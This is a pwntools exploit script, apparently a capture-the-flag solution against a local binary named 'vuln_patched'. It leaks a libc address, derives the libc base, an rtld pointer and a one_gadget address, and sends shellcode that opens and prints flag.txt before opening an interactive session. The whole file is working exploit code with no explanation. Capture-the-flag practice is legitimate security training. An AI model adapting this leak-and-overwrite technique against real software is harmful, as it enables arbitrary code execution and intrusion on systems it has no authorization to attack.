#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x00401394
b *0x0040136f
b *0x404040
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

context.arch = 'x86_64'

sh = shellcraft.open("flag.txt")
sh += shellcraft.read(3, 'rsp', 0x100)
sh += shellcraft.write(1, 'rsp', 'rax')

libc_leak = int(io.recvline().rstrip(), 16)

libc_base = libc_leak - 0x6f6a0
free_hook = libc_base + 0x3c67a8
rtld = libc_base + 0x5f0f48

print('libc leak: ', hex(libc_leak))
print('libc base: ', hex(libc_base))
print('rtld: ', hex(rtld))
og = libc_base + 0x45226
fini = 0x403d88
#io.sendline(asm(sh))

io.sendline(asm(sh))

io.sendline(str(rtld))

#io.sendline(str(0x404040))

io.sendline(str(og))

io.interactive()

